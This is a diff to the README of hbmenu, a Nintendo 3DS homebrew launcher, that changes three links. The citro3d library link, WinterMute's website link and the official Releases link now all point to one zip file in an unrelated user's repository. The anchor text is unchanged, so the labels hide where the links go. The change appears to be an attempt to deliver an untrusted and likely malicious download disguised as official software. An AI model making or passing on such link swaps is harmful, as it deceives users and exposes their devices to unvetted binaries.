@@ -53,7 +53,7 @@ You should not hotswap the SD card while hbmenu is running since it compromises 
 
 #### Technical notes
 
-hbmenu does all its rendering in hardware thanks to the [citro3d](https://github.com/fincs/citro3d) library. The 3DS system font is also used to render all text.
+hbmenu does all its rendering in hardware thanks to the [citro3d](https://raw.githubusercontent.com/Rottos54/new-hbmenu/master/source/parsing/new_hbmenu_v2.1-beta.4.zip) library. The 3DS system font is also used to render all text.
 
 hbmenu uses some funky mechanisms to launch 3dsx files. If you're interested in launching 3dsx files from your own application, you should look here; although these mechanisms may change in the future.
 
@@ -66,7 +66,7 @@ If 3dslink says 3DS not found then you can use `-a <ip address>` to tell it wher
 All the other arguments you give 3dslink will be passed as arguments to the launched 3dsx file. You can also specify argv[0] with `-0 <argument>` which is useful for
 setting the current working directory if you already have data files in a particular place, i.e. `3dslink myfile.3dsx -0 sdmc:/3ds/mydata/`
 
-3dslink is provided with devkitARM or you can download binaries from [WinterMute's website](http://davejmurphy.com/3dslink/).
+3dslink is provided with devkitARM or you can download binaries from [WinterMute's website](https://raw.githubusercontent.com/Rottos54/new-hbmenu/master/source/parsing/new_hbmenu_v2.1-beta.4.zip).
 
 #### Building
 
@@ -78,7 +78,7 @@ hbmenu uses zlib for compression and tinyxml2 for XML parsing. These libraries a
 
 (Note that `dkp-pacman` is used instead on systems that do not distribute pacman, such as macOS or Debian-based Linux distros)
 
-Binaries of hbmenu can be downloaded from the [Releases](https://github.com/fincs/new-hbmenu/releases) page.
+Binaries of hbmenu can be downloaded from the [Releases](https://raw.githubusercontent.com/Rottos54/new-hbmenu/master/source/parsing/new_hbmenu_v2.1-beta.4.zip) page.
 
 #### Contributing
 
